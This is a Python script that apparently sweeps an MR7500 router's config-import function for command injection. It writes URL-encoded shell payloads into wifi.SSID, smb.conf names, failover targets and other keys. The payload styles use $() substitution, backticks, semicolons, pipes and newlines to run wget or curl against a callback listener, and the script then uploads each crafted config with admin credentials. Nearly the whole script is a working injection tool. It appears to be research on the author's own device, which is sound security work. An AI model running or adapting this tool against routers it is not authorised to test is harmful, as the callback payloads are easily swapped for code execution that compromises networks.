"""Config-import command-injection sweep for the MR7500 (vector 2.3).

Extends inject_hostname.py (which only tested router.hostName) to the full set
of untested config keys that land in daemon config files, across several payload
styles. Each payload is an out-of-band (OOB) callback only -- it fetches a unique
URL from the local listener (tools/listener.py); nothing destructive is run. The
listener log tells you which key+style fired.

Values in export.cfg are URL-decoded on import (note the %2E dots), so payloads
are URL-encoded here and arrive decoded at the sink.

Usage:
  # 1. start the listener on the host (192.168.1.4):  python tools/listener.py
  # 2. dry run -- craft + print every config, import nothing:
  python tools/inject_sweep.py
  # 3. actually import each crafted config and reboot-poll between (DESTRUCTIVE to
  #    config state only; it's your device, configs are restorable):
  python tools/inject_sweep.py --fire
  # narrow it down:
  python tools/inject_sweep.py --fire --keys foIpv4Targets,wifi.SSID --styles cmdsub,newline

Env:
  MR7500_ADMIN_PASSWORD   admin password (never hard-code it)
  MR7500_HOST             router IP (default 192.168.1.1)
  MR7500_CALLBACK         OOB host:port the device can reach (default 192.168.1.4:8000)
"""
import os, sys, time, argparse, urllib.parse
# `requests` is only needed for --fire (talking to the device); import it lazily
# so the dry-run craft path works on any machine.

HOST = os.environ.get("MR7500_HOST", "192.168.1.1")
BASE = "http://" + HOST
CALLBACK = os.environ.get("MR7500_CALLBACK", "192.168.1.4:8000")
PASSWORD = os.environ.get("MR7500_ADMIN_PASSWORD", "")
CFG_SRC = os.environ.get(
    "MR7500_CFG", r"C:\Users\david\AppData\Local\Temp\opencode\export.cfg"
)
OUT_DIR = os.environ.get(
    "MR7500_SWEEP_OUT", r"C:\Users\david\AppData\Local\Temp\opencode\sweep"
)

# key -> daemon sink it reaches (from plan-v2 section 2.3). Value-carrying keys
# get their value replaced; feature-flag keys are forced on separately below.
KEYS = {
    "foIpv4Targets": "failover keepalive (periodically pinged via shell)",
    "mediaserver.dlnaFriendlyName": "minidlna config",
    "ready.deviceShare.workgroupName": "smb.conf",
    "ready.deviceShare.networkDeviceName": "smb.conf",
    "wifi.SSID": "hostapd",
    "wifi.aux.SSID": "hostapd (aux)",
    "captiveportal.redirectUrl": "captive portal",
    "router.ipPassThroughHostPcName": "passthrough host config",
    "router.hostName": "hostname (already confirmed baseline)",
}

# style -> builder(token_url) -> raw payload string (actual special chars; we
# URL-encode before writing so the device's decode restores them at the sink).
STYLES = {
    "cmdsub":   lambda u: "x$(wget -q %s -O /dev/null)" % u,
    "backtick": lambda u: "x`wget -q %s -O /dev/null`" % u,
    "semi":     lambda u: "x; wget -q %s -O /dev/null" % u,
    "pipe":     lambda u: "x| wget -q %s -O /dev/null" % u,
    "newline":  lambda u: "x\nwget -q %s -O /dev/null" % u,   # %0A key-smuggling
    "dollar":   lambda u: "x$(curl %s)" % u,
}


def token_url(key, style):
    slug = key.replace(".", "_")
    return "http://%s/hit/%s/%s" % (CALLBACK, slug, style)


def craft(cfg, key, style):
    raw = STYLES[style](token_url(key, style))
    enc = urllib.parse.quote(raw, safe="")
    line = key + "="
    # replace an existing "key=..." line, else append before #End
    import re
    pat = re.compile(r"(?m)^" + re.escape(key) + r"=.*$")
    newline = key + "=" + enc
    if pat.search(cfg):
        return pat.sub(newline, cfg, count=1)
    if "#End" in cfg:
        return cfg.replace("#End", newline + "\n#End", 1)
    return cfg + "\n" + newline + "\n"


def login(s):
    sec = s.get(BASE + "/model.json", timeout=12).json()["session"]["secToken"]
    s.post(BASE + "/Forms/config", data={
        "token": sec, "err_redirect": "/x", "ok_redirect": "/model.json",
        "session.password": PASSWORD}, timeout=12)
    return s.get(BASE + "/model.json", timeout=12).json()["session"]["secToken"]


def import_cfg(s, sec, cfg, label):
    files = {"config": ("export.cfg", cfg.encode(), "application/octet-stream")}
    data = {"token": sec, "ok_redirect": "/index.html?import=success",
            "err_redirect": "/index.html?import=failed"}
    r = s.post(BASE + "/Forms/Import", data=data, files=files, timeout=60, allow_redirects=False)
    print("    import [%s] -> %s %s" % (label, r.status_code, r.headers.get("Location")))


def main():
    ap = argparse.ArgumentParser(description="MR7500 config-import injection sweep")
    ap.add_argument("--fire", action="store_true", help="actually import each config (default: dry run)")
    ap.add_argument("--keys", help="comma-separated subset of keys")
    ap.add_argument("--styles", help="comma-separated subset of styles")
    ap.add_argument("--settle", type=float, default=20.0, help="seconds to wait after each --fire import")
    a = ap.parse_args()

    keys = a.keys.split(",") if a.keys else list(KEYS)
    styles = a.styles.split(",") if a.styles else list(STYLES)
    for k in keys:
        if k not in KEYS:
            print("unknown key:", k); return
    for st in styles:
        if st not in STYLES:
            print("unknown style:", st); return

    cfg = open(CFG_SRC, "r").read()
    os.makedirs(OUT_DIR, exist_ok=True)
    print("[*] host=%s callback=%s styles=%s" % (HOST, CALLBACK, ",".join(styles)))
    print("[*] %d keys x %d styles = %d cases" % (len(keys), len(styles), len(keys) * len(styles)))
    print("[*] OOB only: payloads fetch a unique URL from tools/listener.py; watch its log.")

    s = None
    sec = None
    if a.fire:
        if not PASSWORD:
            print("[!] set MR7500_ADMIN_PASSWORD to --fire"); return
        import requests
        s = requests.Session(); s.headers["User-Agent"] = "Mozilla/5.0"
        sec = login(s)
        print("[*] logged in, secToken:", sec)

    for key in keys:
        print("\n### %-32s (%s)" % (key, KEYS[key]))
        for style in styles:
            mod = craft(cfg, key, style)
            label = "%s-%s" % (key.replace(".", "_"), style)
            path = os.path.join(OUT_DIR, "cfg_%s.cfg" % label)
            open(path, "w").write(mod)
            print("  %-9s url=%s" % (style, token_url(key, style)))
            if a.fire:
                try:
                    import_cfg(s, sec, mod, label)
                except Exception as e:
                    print("    import ERR", repr(e))
                time.sleep(a.settle)
                try:  # session likely died across the reboot; re-login
                    sec = login(s)
                except Exception as e:
                    print("    re-login pending (%s); retrying once" % e.__class__.__name__)
                    time.sleep(a.settle)
                    sec = login(s)

    print("\n[*] crafted configs in", OUT_DIR)
    print("[*] grep the listener log for /hit/<key>/<style> to see which sinks executed.")


if __name__ == "__main__":
    main()
